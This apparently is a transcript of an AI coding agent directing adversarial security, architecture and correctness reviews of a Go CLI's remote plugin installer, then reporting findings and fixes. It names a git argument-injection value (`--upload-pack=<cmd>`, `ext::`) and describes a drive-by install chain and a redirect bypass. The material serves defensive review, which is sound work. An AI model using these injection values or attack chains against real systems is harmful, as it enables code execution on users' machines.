- `index.json` entries (`name`, `repo_url`, `description`, `official`, `platforms`) — the index is a remote git repo; a repo can point contributors at an arbitrary index via `plugins.index_url` committed in `.entire/settings.json`, and `--index` / `ENTIRE_PLUGIN_INDEX_URL` also set it.
- `entire-plugin.yml` in a plugin repo (`name`, `description`, `download_url` template, `requires[]` with `name`/`repo_url`/`min_version`).
- The release server's `checksums.txt` and asset bytes.
- Archive contents (tar.gz/zip entry names, sizes, types).
- git tag names.
- The `pkg/<name>/manifest.yml` on disk.

## Ground already covered — do NOT just re-report these

Already found and fixed (verify the fixes are actually complete/correct, but don't present them as new):
1. Argument injection into the git CLI via option-shaped `repo_url` (`--upload-pack=<cmd>` is shell-interpreted) → fixed with a scheme allowlist (`validatePluginRepoURL`) plus `--` before git positionals.
2. Plaintext HTTP allowed for downloads → now https-only except loopback (`requireSecureAssetURL`).
3. Unverified downloads (no `checksums.txt`) silently installed → now refused unless `--allow-unverified`.
4. Installed binary integrity not checkable → `binary_sha256` recorded and re-hashed by `doctor`.
5. Archive entries silently truncated at 512 MiB → now errors.
6. Asset name path traversal in `fetchAndVerify` → rejected.
7. Index cache had no file locking → now flock-guarded.

## Your charge

Find what these fixes MISSED, and what nobody has looked at yet. Specifically try to:
- Defeat the checksum verification. Can you get an unverified or attacker-chosen binary installed without `--allow-unverified`? Look hard at the interaction between the checksum-manifest loop, the fall-through when a manifest lists nothing for the platform, and the probe fallback. Is there a downgrade path?
- Escape the https requirement. Is `requireSecureAssetURL` applied on every path that fetches bytes? Consider redirects — does the HTTP client follow a redirect from https to http, and is the final URL re-checked?
- Defeat `validatePluginRepoURL`. Any git transport or URL form that slips through the allowlist and still does something dangerous? Consider `file://` (is it a problem that it is allowed?), scp-like forms, and whether `--` is on EVERY git invocation.
- Attack the archive extraction: symlink entries, hardlink entries, device files, `..` in names, absolute paths, null bytes, zip-slip, gzip bombs, name collisions, case-insensitive filesystem tricks on macOS/Windows.
- Attack the filesystem layout: `pkg/<name>/` and `bin/` paths derived from names, symlink following on write (`os.OpenFile` with `O_CREATE` but not `O_EXCL` — can a pre-placed symlink redirect a write?), TOCTOU between check and use, the Windows `.old-` rename-aside, staging dir permissions.
- Attack the dependency graph: can metadata cause unbounded work, an install the user never confirmed, or a plugin to be replaced by a different one? Is `--force` reachable in a way that bypasses the remove guard dangerously?
- Question the trust model itself: index-listed repos install with NO prompt. Is that defensible? What does compromising the default index (`entireio/plugin-index`) get an attacker, and what stops it?
- Look for privacy/telemetry leaks: does anything log user content, tokens, or URLs with credentials (`REDACTED`)? Check the `logging` calls and error messages — an error string containing a credentialed URL is a leak.

## Rules

- VERIFY every claim against the actual code before reporting it. Read the functions. If you assert behavior, name the file and line.
- Where feasible, prove it: write and run a Go test or a shell repro in `/tmp` and report the output. A confirmed exploit beats ten speculations.
- For each finding give: severity, file:line, the concrete attack path (who controls what input, what command the user runs, what happens), and whether you CONFIRMED it by execution or it remains SPECULATIVE.
- Explicitly state what you tried that did NOT work — negative results are valuable and stop us re-litigating.
- Do not modify any tracked file in the repo. Use `/tmp` for scratch work. Do not commit, push, or run `mise run test:ci`.
- Rank findings most severe first. If you find nothing real in a category, say so plainly rather than padding.

You are performing an ADVERSARIAL review of a feature's CONCEPT and ARCHITECTURE — not a line-level bug hunt. Your default position is that this feature is over-built, mis-scoped, or solving the wrong problem. Argue that case as strongly as the evidence allows, then concede only what you must.

## Context

Repo: `/Users/soph/Work/entire/devenv/cli_experiments_2` (Go CLI, branch `ashtom/plugin-index`, PR #1422).
Net change: `git diff origin/main...HEAD` — 20 files, ~5100 insertions, ~46 deletions.

Pre-existing (already on main, NOT under review): the kubectl-style dispatcher — `entire <name>` execs `entire-<name>` from `$PATH`; a managed dir `~/.local/share/entire/plugins/bin` is prepended to PATH; `entire plugin install/list/remove` handled LOCAL symlink installs only. Read `docs/architecture/external-commands.md` for the founding decisions of that layer.

What this PR adds:
- Remote install from any git host: newest semver tag via `git ls-remote`, optional `entire-plugin.yml` metadata via blobless shallow clone, release-asset download through a per-host URL convention table with a `download_url` template escape hatch, checksum verification, binaries in `pkg/<name>/` with a provenance `manifest.yml`, linked into `bin/`.
- `plugin upgrade [name|--all]`, `--pin`.
- Discovery: a krew-style git-synced index (`index.json` in a git repo, shallow-cloned into the user cache, TTL refresh, stale-on-offline), with `search`/`info`/`browse`/`index update` subcommands. Index URL precedence: `--index` > `ENTIRE_PLUGIN_INDEX_URL` > `plugins.index_url` in `.entire/settings.json` > built-in default.
- Dependencies: `entire-plugin.yml` `requires[]` (name, repo_url, min_version — no ranges), install-time transitive planning, apt-style single confirmation, a remove guard, and `plugin doctor`.

## Your charge — attack the concept

Interrogate, with evidence from the code and docs:

1. **Should this exist at all?** The pre-existing model is "drop a binary on PATH." This PR adds a package manager. Is that justified, or is it Not Invented Here? Compare honestly against: `go install`, Homebrew, `krew`, asdf/mise (this repo already uses mise!), or simply documenting `curl | tar | mv`. What does this buy that those don't, for a CLI whose plugin ecosystem currently has roughly two plugins (`entire-ci`, `entire-upgrade`)? Is the complexity proportionate to the demand?

2. **Is the dependency system justified?** Plugins are standalone executables invoked over PATH with no protocol. Why do they need a dependency solver at all? The PR cites `entire-brain` needing `entire-sem`. Could that be solved by the plugin vendoring, or by documenting a prerequisite, or by the plugin checking at runtime? Weigh the cost: transitive planning, cycle bounds, min_version comparison, a remove guard, doctor checks, and per-dependency network calls during planning. Is `requires[]` a feature that will be used by anyone?

3. **Is the git-synced index the right mechanism?** It shallow-clones a git repo to read one JSON file. Attack that: why not fetch the raw JSON over HTTPS (one request, no git, no cache dir, no lock, no clone corruption)? What does git buy? Does the TTL/stale/offline machinery pay for itself? Is `plugins.index_url` in *repo-level committed settings* a good idea — a checked-out repo redirecting a user's plugin catalog?

4. **Coherence and consistency.** Does the design fit the repo's existing conventions? Check: settings vs manifests split, error handling (`SilentError`), interactive prompts (`huh`, accessibility mode), logging vs user output, `userdirs` for cache paths, test isolation rules. Read `CLAUDE.md` in the repo root. Flag anything that reinvents an existing helper or violates a documented rule.

5. **Surface area and future cost.** Count the new user-facing commands and flags. Which will be regretted? Is anything under-specified in a way that will force a breaking change later — the `index.json` schema, `entire-plugin.yml` schema, the `manifest.yml` format, the `pkg/`/`bin/` layout, the `download_url` template placeholders? What migration story exists if any of these change?

6. **Naming and UX collisions.** `entire upgrade` runs the `entire-upgrade` plugin which self-updates the CLI (special-cased in `plugin.go` via `selfUpdatePluginName`), while `entire plugin upgrade` updates plugins. There are two notions of "official": a hardcoded `officialPlugins` telemetry allowlist in `plugin_official.go` and an `official` boolean in `index.json`. Are these acceptable or are they design smells?

7. **What is missing that a real package manager needs?** Think about what will bite in six months: uninstall of orphaned dependencies, lockfiles/reproducibility, version pinning across a team, signature verification (there is none — checksums come from the same origin as the asset), yanked releases, plugin API/CLI-version compatibility declarations, offline install, mirror/proxy support in restricted networks, telemetry on install failures.

## Rules

- Ground every claim in the code or docs — cite file:line. Do not speculate about code you did not read.
- Be specific about cost. "This is complex" is worthless; "this adds N commands, M flags, and a network round-trip per dependency during planning at plugin_deps.go:NNN" is useful.
- Distinguish (a) fatal design problems, (b) things that should be cut or deferred, (c) things that are fine and you tried to attack but could not. Include (c) honestly — I want to know where the design holds up.
- Give a bottom line: should this ship as-is, ship reduced (say exactly what to cut), or not ship? Commit to a recommendation.
- Do not modify any tracked file. Do not commit or push. Use `/tmp` for scratch notes.

You are performing an ADVERSARIAL correctness review. Assume this code has bugs and find them. Do not summarize what the code does or praise it — hunt for cases where it produces a wrong result, corrupts state, hangs, or misreports success.

## Context

Repo: `/Users/soph/Work/entire/devenv/cli_experiments_2` (Go CLI, branch `ashtom/plugin-index`, PR #1422).
Net change: `git diff origin/main...HEAD` — 20 files, ~5100 insertions.

The feature adds remote plugin install to the `entire` CLI: resolve newest semver tag via `git ls-remote`, read optional `entire-plugin.yml`, download+verify a release asset, extract the binary to `pkg/<name>/`, link into `bin/`, write a provenance `manifest.yml`. Plus a git-synced plugin index for discovery, `requires[]` dependencies with install-time planning, `plugin upgrade`, and `plugin doctor`.

Key files to attack: `cmd/entire/cli/plugin_fetch.go`, `plugin_gitremote.go`, `plugin_index.go`, `plugin_install_remote.go`, `plugin_deps.go`, `plugin_group.go`, `plugin_manifest.go`, `settings/settings.go`.

## Ground already covered — do NOT re-report these

Found and fixed already: git argument injection via `repo_url`; `download_url` query string breaking archive-extension detection; index schema `version` gate; plaintext HTTP; unverified downloads now needing `--allow-unverified`; `binary_sha256` recorded and checked by doctor; silent truncation of oversize archive entries; missing flock on the index cache; diamond `min_version` skipped by a name-only visited set; `DepAction.FromIndex` written but never read.

Known and deliberately left open (don't report as new): dependency upgrades install the newest tag without confirming `min_version` was reached (doctor catches it); two notions of "official"; `entire upgrade` vs `entire plugin upgrade` naming.

## Where to dig — be systematic

**Version/semver logic.** `canonicalSemver`, `listRemoteSemverTags` sorting, `UpgradeInstalledPlugin`'s two comparisons, `--pin` interaction with upgrade, prerelease tags (`v1.0.0-rc1`), build metadata (`v1.0.0+meta`), tags like `v1.0` or `1`, duplicate tags differing only by `v` prefix, `maxTagFallbacks` truncation to 3 (does it interact badly with a repo whose 3 newest tags all lack assets?).

**Asset/checksum selection.** `assetCandidates` ordering and the `darwin_all` universal fallback, `osAliases`/`archAliases`, `parseChecksums` (lines with more or fewer than 2 fields, CRLF line endings, `*` binary marker, duplicate filenames, uppercase digests), `selectAssetFromChecksums` preference order, the `.exe` extension list on Windows.

**Extraction.** `matchesPluginBinary` (basename match — what if an archive has multiple matching entries? first wins, is order deterministic?), `safeArchiveEntry`, the raw-binary path's extension sniffing, `extractPluginBinary` deciding format purely by filename suffix (what if a `.tar.gz` is actually a zip, or an asset has no extension?).

**Install/upgrade state machine.** `installRepoAtTag`'s ordering: existing-install check → download → extract → `EnsurePluginPkgDir` → `sweepOldBinaries` → `replaceBinary` → `InstallPluginFromPath` → hash → `SavePluginManifest`. What happens on failure at each step — is state left inconsistent (binary placed but no manifest, manifest but no bin entry, half-swept `.old-` files)? Is the operation idempotent on retry? `replaceBinary`'s cross-device copy fallback and the Windows rename-aside: can they lose the old binary without installing the new one?

**Index.** TTL logic and the `.entire-last-sync` marker (what if the clock moves backwards, or the marker is newer than now?), `refreshPluginIndexClone` (`fetch origin HEAD` + `reset --hard FETCH_HEAD` — what if the index repo's default branch changes, or history is force-pushed, or the clone is shallow and the remote rebased?), stale-on-offline (does a *corrupt* cached index masquerade as offline?), `loadPluginIndexFromDir` entry filtering (duplicate names in `index.json` — which wins? `Find` returns the first; is that consistent with `Search` and `HasRepoURL`?), `normalizeRepoURL` (case sensitivity, trailing `.git/`, `//` in paths).

**Settings.** `PluginSettings.Validate`, `IndexTTL` (negative/zero/huge values, overflow on `time.Duration(hours) * time.Hour`), `mergePlugins` whole-object replacement semantics vs the local-override file.

**Cross-platform.** Windows path handling, `.exe` suffixes, symlink fallback to hardlink to copy, case-insensitive filesystems. The repo runs a `test-windows` CI job.

**Concurrency.** Two `entire plugin` processes installing the same plugin, or one installing while another dispatches that plugin (executing a binary while it is being replaced).

## Rules

- VERIFY before reporting. Read the function. Cite file:line. If you claim behavior, be sure.
- PROVE what you can: write a Go test in a scratch file, run it with `go test -run <name> ./cmd/entire/cli/`, report the actual output, then DELETE the scratch file. # Addendum: test-verification gaps (partially retracts credit (c)#8)

I credited test hygiene as "above the bar." That holds for the unit tests, but **not** for the four integration tests covering the riskiest path in the PR. Correcting:

### The integration tests have silently opted out of the repo's hermeticity tripwire

`cmd/entire/cli/integration_test/setup_test.go:26-42` sets `ENTIRE_TEST_GIT_HERMETIC=1` process-wide and states the assumption that makes it work:

> "isolation must come from the environment, which children inherit **because all integration env building starts from `os.Environ()` (`testutil.GitIsolatedEnv`)**" … "The config lives in the file because `GitIsolatedEnv` strips inherited `GIT_CONFIG_*` env"

The flag is inert on its own. It only bites through the per-host `http.<url>.proxy` entries that `testutil.GitIsolatedEnv()` writes into an isolated `GIT_CONFIG_GLOBAL` (`testutil/testutil.go:289-302`), which route `github.com`/`gitlab.com` to a dead loopback address so a stray network dial fails fast. `hermeticity_test.go:14-19` exists specifically to prove this fires, against named regressions (#1463, 53bc37a88).

The new helper at `integration_test/plugin_remote_install_test.go:124` builds the child env from bare `os.Environ()` and never calls `GitIsolatedEnv()`. Every other integration spawn does (`testenv.go:137, 679, 1112`; `hooks.go:210, 429`). Consequence: the child gets `ENTIRE_TEST_GIT_HERMETIC=1` with **no config file backing it** — flag set, tripwire absent, developer's real global git config inherited.

Why this matters beyond hygiene: **if index-URL resolution regressed to the built-in default `https://github.com/entireio/plugin-index`, these four tests would quietly clone from the real network and pass.** That is the exact code path carrying F1 and F2. The tests that are supposed to guard the trust model cannot detect the most likely way it breaks.

Second defect in the same helper: `cmd.Dir` is never set (`plugin_remote_install_test.go:135-144`), against `testenv.go:174`'s `cmd.Dir = env.RepoDir`. The spawned `entire` therefore inherits the test process CWD — inside the real repo — and resolves `.entire/settings.json` from it (`settings.go:521-540`). content.text:
All six checks confirm the agents. Tree is clean.

## Bottom line

The panel found substantially more than the six review rounds before it. Three independent agents converged on the same central problem, and **two of the worst findings are in code I wrote today** — my HTTPS enforcement is bypassable and my URL validator contradicts the one already in the settings package. The "all checks green, no open findings" state I reported an hour ago was not a good proxy for risk.

## The central flaw: the trust root is attacker-choosable

Security and architecture agents hit this independently; the security agent confirmed it end-to-end by execution, and I verified the mechanism myself.

Two decisions compose into drive-by code execution:
- `plugins.index_url` is read from `.entire/settings.json` — the **committed** file, and the merge base at `settings.go:526`
- index-resolved installs set `trusted = true` and skip confirmation entirely (`plugin_group.go:182-193`)

So: clone any repo containing four lines of JSON, run `entire plugin install <any-name-in-their-catalog>`, and their binary is downloaded, chmod 0755, and linked into your managed bin dir — no prompt, no `--yes`, no warning. `plugin browse` does it on one keypress (I confirmed it calls `runRemoteInstall` directly at `plugin_group.go:658`). Their `official: true` badge renders as a trust signal from attacker-controlled data.

This is not something my fixes introduced — repo-level `plugins.index_url` was an advertised feature of the original PR. But it means the git-argument-injection hardening I did was defending the back door while the front door was open.

## My two regressions

| Finding | Status |
|---|---|
| **`requireSecureAssetURL` is bypassable via redirect.** `pluginHTTPClient` has no `CheckRedirect`; Go follows up to 10 redirects **across schemes** and the final URL is never re-validated. Both the asset and `checksums.txt` can arrive over plaintext — voiding my own doc comment verbatim. | I confirmed `CheckRedirect == nil`; agent confirmed the exploit by execution. One-line fix. |
| **My validator contradicts the existing one.** `validatePluginRepoURL` accepts `http://`, `git://`, and absolute paths; `PluginSettings.Validate` rejects all three. My comment claims it "mirrors" that allowlist. It does not. | Confirmed all three cases disagree. |

The second one matters beyond tidiness: `--index` and `ENTIRE_PLUGIN_INDEX_URL` bypass the settings validator, so the catalog that authorizes unprompted installs can be fetched over `git://` — no auth, no encryption — while I force HTTPS on the payload it authorizes.

## Correctness findings I verified myself

- **Prereleases rank as newest.** `v2.0.0-rc1` beats stable `v1.9.0`, so `plugin upgrade --all` migrates everyone onto release candidates the moment an author pushes one.
- **`darwin_all` doesn't exist.** `"all"` sits in the OS slot, generating `_all_arm64`; goreleaser puts it in the arch slot. The docs explicitly promise this fallback. macOS universal binaries can never install.
- **Empty `entire-plugin.yml` is fatal.** Empty or comment-only → `EOF` hard error at every tag, though metadata is documented as optional and a *missing* file is handled correctly.
- **`index_ttl_hours: 2562048` → negative duration**, i.e. always stale. `Validate` accepts it.

Plus, claimed-confirmed by agents and consistent with code I've read: **`plugin upgrade` can silently downgrade** and report "up to date"; **case-insensitive filesystems let installing plugin `Run` overwrite installed `run`** without `--force`; **the installed name comes from the remote**, so `install safe` can install `hijack`; **the cross-device copy path destroys the working binary on failure** (and is the *normal* path when `/tmp` is a separate filesystem); **credentialed URLs leak into `.entire/logs/` and `doctor bundle`**; and **`binary_sha256` is self-defeating** — the digest sits mode-0644 next to the binary, so anything that swaps one re-records the other.

## The concept verdict

The architecture agent's answer to "should this exist" is **ship reduced**, and its strongest argument is one I hadn't considered: this repo already ships Entire-owned external binaries through mise in two lines (`mise.toml:7-8`), including an `entire-agent-*` plugin, getting version resolution, a managed PATH dir, pinning and a lockfile for free. Against ~2,700 production lines for an ecosystem of one shipped plugin (`officialPlugins = ["ci"]`).

It recommends cutting `requires[]` (the motivating `entire-brain`/`entire-sem` example exists nowhere in the codebase; `min_version` is computed and never enforced; orphans leak forever), `browse`, `index_ttl_hours`, and `platforms`. It concedes the git-synced index is defensible — git buys auth inheritance for private catalogs, which a raw HTTPS GET wouldn't.

## What held up

Worth recording, since it's where the design is genuinely good: archive extraction was attacked hard and did not yield — symlink, hardlink, device, `../`, absolute, NUL and zip-slip entries all correctly refused, setuid mode not inherited. The `--upload-pack` injection fix holds against every payload tried, including `ext::`. No checksum-verification *bypass* was found — the fall-through I worried about correctly refuses. `classifyInstallArg` resisted local-file shadowing. The `limit+1` truncation fix works. Repo-convention compliance is strong.

## Where I'd go next

I don't think I should act on this unilaterally — it splits into three very different buckets:

1. **Cheap and unambiguous** (~half a day): `CheckRedirect`, one URL validator, drop `http://`/`git://`, prereleases, `darwin_all`, empty-YAML, TTL clamp, `O_NOFOLLOW`, strip URL userinfo, git timeouts, and the integration-test hermeticity gap. All defects with no design question attached.
2. **The trust model** — index URL out of committed settings, and/or prompt on non-default indexes. This changes an advertised feature and is Thomas's call.
3. **The cuts** — removing `requires[]` and `browse` is a scope decision on someone else's PR that I shouldn't make.

My recommendation: let me do bucket 1 now, and take buckets 2 and 3 to Thomas with the reports. Fixing hermeticity first matters, because until then the four integration tests guarding the trust model would pass even if index resolution silently fell back to the real network.

One caveat on the panel itself: the architecture agent initially credited test hygiene and then retracted part of it after auditing — so its confidence isn't uniform, and I'd treat its *cut* recommendations as arguments to weigh rather than conclusions. The security and correctness findings I've spot-verified held up every time I checked.

content.text:
Bucket 1 is done and pushed. All GitHub checks pass; only the human-approval gate is outstanding.

## What landed (`9c5cf27e5`)

| Fix | Why it mattered |
|---|---|
| **Integration-test hermeticity** — done first | Tests built child env from `os.Environ()`, so `ENTIRE_TEST_GIT_HERMETIC=1` was set with no config backing it. A regression to the default index would have cloned the real `entireio/plugin-index` and *passed*. `cmd.Dir` was also unset, leaving the child reading the real repo's committed settings. |
| **Redirect re-validation** | Go follows up to 10 hops across schemes; only the entry URL was checked. My HTTPS rule was bypassable by any open redirect. Now every hop is checked; same-transport CDN hops still work. |
| **One URL validator, narrowed** | The two validators disagreed on `http://`, `git://`, and absolute paths — `--index /srv/idx` worked while the same committed setting was a hard failure. Both now call `settings.ValidateGitURL`; `http://`/`git://` dropped. |
| **Prereleases excluded** | `v2.0.0-rc1` outranked stable `v1.9.0`, so `upgrade --all` moved everyone onto release candidates. Plus stable sort for semver-equal tags. |
| **`darwin_all`** | `all` was in the OS slot generating `_all_arm64`; universal macOS releases could never install despite the docs promising the fallback. |
| **Atomic, non-symlink-following writes** | `O_CREATE|O_TRUNC` without `O_EXCL` followed a planted symlink, and `O_TRUNC` destroyed a working binary before new bytes were validated — on the cross-device path, which is normal when `/tmp` is separate. |
| **Credential redaction** | Userinfo stripped from every URL before print/log/persist, git stderr scrubbed. `.entire/logs/` is in the working tree and `doctor bundle` zips it wholesale; `manifest.yml` is 0644. |
| **Bounded git subprocesses** | Root context has no deadline, so an unreachable host hung indefinitely. 2 min/invocation, plus `LC_ALL=C` (the "no metadata" branch substring-matches English stderr) and ssh `BatchMode`. |
| **Empty `entire-plugin.yml`** | Empty/comment-only decoded to `io.EOF` and aborted every install of that plugin. |
| **`index_ttl_hours` bounds** | Past ~2.5M hours it wrapped negative — always stale. Also: a future-dated sync marker no longer freezes the cache forever. |

Two of these were regressions I introduced yesterday — the bypassable redirect and the contradictory validator. Worth stating plainly: my own hardening created the second-worst finding in the set.

Verification: `mise run test:ci` exits 0, lint 0 issues, and I smoke-tested the behavior changes against a real binary — `http://` and bare-path indexes now refused with a clear message, credentials absent from error output.

## One thing to flag

A new agent-review finding just appeared on the trail, at `plugin_deps.go:251` — `ExecuteDepPlan` installing from `a.RepoURL`. That's the same area as the `FromIndex` finding I fixed earlier, so it's likely either a restatement or a sharper version of it. I haven't read it yet.

Also worth noting: three review rounds have now each produced a finding in `plugin_deps.go`. That's the fourth. The dependency subsystem keeps generating defects — which is independent support for the architecture agent's recommendation to cut `requires[]` rather than keep patching it.

## Where things stand

Buckets 2 and 3 are untouched, as agreed:
- **Trust model** — repo-committed `plugins.index_url` + index-listed-never-prompts is still a working drive-by. This is the most serious open item and it's Thomas's design call.
- **Cuts** — `requires[]`, `browse`, `index_ttl_hours`, `platforms`.

Also still open from the reviews, deliberately: `plugin upgrade` can silently downgrade and report "up to date"; case-insensitive filesystems let installing `Run` overwrite `run`; the installed name comes from the remote, so `install safe` can install `hijack`; `binary_sha256` is self-defeating against an adversary; and the unit tests don't call `testutil.IsolateGitConfigEnv` (fixing that would force dropping `t.Parallel()` on several, so it wants a decision).

content.text:
Both confirmed, and one is significant: `.entire/settings.local.json` **is** gitignored (via `.entire/.gitignore`), which makes the per-user fix option viable. And the new trail finding is the *same* root cause the security and correctness agents each found independently — the remote-declared name is never reconciled. That's now three independent discoveries of one defect.

Here's the brief for Thomas.

---

## Context to give him first

Ten commits were added to his branch: a merge with main (2053 commits), fixes for 13 bot findings' worth of follow-on issues, four trail findings, and a tranche of defects from a three-agent adversarial review. Two of those commits change default behavior — checksums now required for install, and `http://`/`git://` no longer accepted for repo or index URLs. All CI is green.

A calibration note worth passing on: the review panel was deliberately adversarial, one agent retracted part of its own assessment mid-flight, and an earlier finding had a conclusion that turned out to be wrong. Everything below I spot-verified myself. But the *cut* recommendations are arguments to weigh, not verdicts.

## Bucket 2 — the trust model

**The chain.** Three existing decisions compose into remote code execution:

1. `plugins.index_url` is read from `.entire/settings.json` — the **committed** file, and the base of the settings merge (`settings.go:526`)
2. A bare-name install resolves through that index and sets `trusted = true` (`plugin_group.go:182`)
3. `trusted` skips the confirmation prompt entirely (`plugin_group.go:193`)

So: someone publishes a repo containing four lines of JSON. A victim clones it and runs `entire plugin install <any-name-in-their-catalog>` from inside it. The attacker's binary is downloaded, `chmod 0755`, and linked into the user's managed `bin/` — which is on `PATH` for every future `entire` invocation. No prompt, no `--yes`, no warning. `entire plugin browse` does it on one keypress.

**Precision on what it requires:** cloning alone isn't enough — the victim must run a plugin install from within the repo. That's a real bar, but not much of one for a tool whose README headline example is `entire plugin install upgrade`.

**Why it's worth his attention specifically:** the PR already treats index entries as attacker-influenced — that's the stated reason for the `--upload-pack` hardening in `external-commands.md`. The same document then keeps "index-listed ⇒ no prompt." The hardening defends the back door; this is the front one. It also makes the `official: true` badge a trust signal rendered from attacker-controlled data.

**Four ways out, with what each costs:**

| Option | Effect | Cost |
|---|---|---|
| **A.** Accept `index_url` only from `settings.local.json` / `--index` / env | Closes it completely. `settings.local.json` is gitignored, so it's genuinely per-user. | Kills the "a company commits an internal catalog" feature as designed — contributors would each opt in manually. |
| **B.** Keep repo-level, but prompt once per never-before-seen index URL and remember the answer per-user | Preserves the feature; turns a silent redirect into one informed decision. Trust-on-first-use, same shape as SSH host keys. | New per-user trust state to store. |
| **C.** Repo-level index may drive discovery (`search`/`info`), but installs from a non-default index always confirm | Keeps catalog browsing frictionless, gates only the dangerous verb. | Two classes of index, slightly more to explain. |
| **D.** Always print the effective index URL and require `--yes` when it isn't the built-in default | Cheapest. | Relies on the user reading a line they'll learn to skip. |

**My recommendation: B.** It's the only one that keeps the internal-catalog feature — which is clearly deliberate design, not an accident — while making the redirect visible exactly once. A is the safe fallback if he'd rather not add trust state.

Worth noting the sub-question separately: *is "index-listed ⇒ no prompt" itself wrong?* I don't think so. For a curated index the user chose, no-prompt is good UX. The problem is purely **who chose the index**. Fix provenance and the no-prompt rule becomes defensible again — which is why I'd frame this to him as a provenance bug, not an argument for more prompting.

## Bucket 3 — the cuts

**`requires[]` (dependencies) — the strongest case, ~430 production + ~405 test lines.**

Evidence: the motivating example (`entire-brain` needs `entire-sem`) exists nowhere in the codebase — only in the PR body and one docs line. `min_version` is computed, including a diamond-constraint resolver I fixed, but never enforced on the *outcome*: `ExecuteDepPlan` installs the newest tag, so if newest < minimum the install reports success and `doctor` nags forever. Orphans leak permanently — there's no `auto_installed` marker, so `install brain` pulls `sem` and `remove brain` leaves it behind with doctor silent. Planning does one `ls-remote` plus one-to-two shallow clones **per dependency** against author-controlled URLs, before any confirmation. And it's the one path that could hang unbounded (now fixed with a timeout).

Most telling: **four of the review findings landed in `plugin_deps.go`, across four separate rounds** — including the one that arrived while I was writing this. The subsystem keeps generating defects.

The counter he'll reasonably raise: plugins may grow real dependencies later, and re-adding is harder than keeping. That counter is weaker than it looks for a specific reason — see the next item.

**`browse` — cut.** No capability over `search` + `install`, requires a TTY, installs with no confirmation, over a catalog with three entries.

**`index_ttl_hours` — cut, hardcode 24h.** `plugin index update` already forces a refresh and stale-on-offline already covers the failure mode, so the knob tunes a problem solved twice. It also costs two settings loads per sync. (It had an overflow bug — fixed — but the knob is still unearned.)

**`platforms` in `index.json` — cut.** Warning-only; the install proceeds regardless. And it lives in the catalog rather than with the author, so it drifts and then warns about a working plugin.

## The item that isn't a cut but has a deadline

**`entire-plugin.yml` uses strict decoding** (`plugin_manifest.go:119`, `dec.KnownFields(true)`), which is the exact inverse of the decision we made for `index.json` in the same PR — where the reasoning is that an artifact read by every shipped CLI must degrade rather than refuse.

`entire-plugin.yml` is that same class of artifact, and it has no `version` field to gate on. So the first plugin author who adds any new field — `min_cli_version`, `bin_name`, anything — breaks installs on every older CLI, permanently, for everyone. The author can't fix that for existing users.

The benefit is catching author typos, which is real but badly asymmetric: a typo is caught once by the author testing their own plugin; a forward-compat break is unfixable and fleet-wide. The better split is lenient parsing plus an `entire plugin lint` for authors.

**This is cheap and it expires.** Once third-party `entire-plugin.yml` files exist in the wild, older CLIs stay broken forever. It's also the reason the "keep `requires[]` for later" counter is weak — if `requires[]` is cut and re-added, authors adopting it would break older CLIs unless decoding is lenient first.

## The concept-level question, stated fairly

The architecture agent's verdict was **ship reduced**, and its sharpest argument deserves to reach him intact: this repo already ships Entire-owned external binaries through mise in two lines (`mise.toml:7-8`) — including an `entire-agent-*` plugin — getting version resolution, a managed PATH dir, pinning and a lockfile for free. Against ~2,700 production lines for an ecosystem of one shipped plugin (`officialPlugins = ["ci"]`).

The honest counter, which the agent conceded: mise's `go:` backend needs a Go toolchain, Homebrew needs a tap plus a formula per plugin and skips Windows, `go install` needs Go, krew is kubectl-only. A non-developer on Windows is genuinely underserved by all of them, and `entire plugin install <git-url>` is a real new capability. So "just use mise" isn't free — but the floor isn't nothing either; it's `plugin install <url>` plus a documented mise line.

## What held up under attack

Important that this doesn't read as a hatchet job — several things were attacked hard and didn't yield:

- **Archive extraction is solid.** Symlink, hardlink, device, `../`, absolute-path, NUL and zip-slip entries all correctly refused; setuid mode not inherited. The `Typeflag != tar.TypeReg` filter plus a single fixed destination make zip-slip structurally unreachable.
- **The `--upload-pack` fix holds** against every payload tried, including `ext::`.
- **No checksum-verification bypass exists** — the manifest fall-through correctly refuses rather than silently downgrading.
- **`classifyInstallArg` resisted** local-file shadowing.
- **`bin/` as sole dispatch surface** with `plugin.go` untouched, and reusing `InstallPluginFromPath` for linking, was praised as the right layering.
- **The `index.json` version-recorded-not-enforced decision** survived a deliberate attempt to argue for enforcement.

## Also worth telling him: the top remaining defect

Not in either bucket, but three independent reviewers found it, so it should be on his list. **The installed plugin name comes from the remote, not from what the user asked for** (`plugin_install_remote.go:97-102`). `entire plugin install safe` can install `hijack`. Consequences: name-squatting via an index entry with no prompt; `--force` scope escalation, since the already-installed guard tests the *remote-declared* name; and for dependencies, the install "succeeds" while `dependencySatisfied` keeps looking for the requested name — so it's re-attempted on every future parent install and doctor reports it missing forever.

**Your proposal is better than the trust-on-first-use option I recommended.** Three reasons:
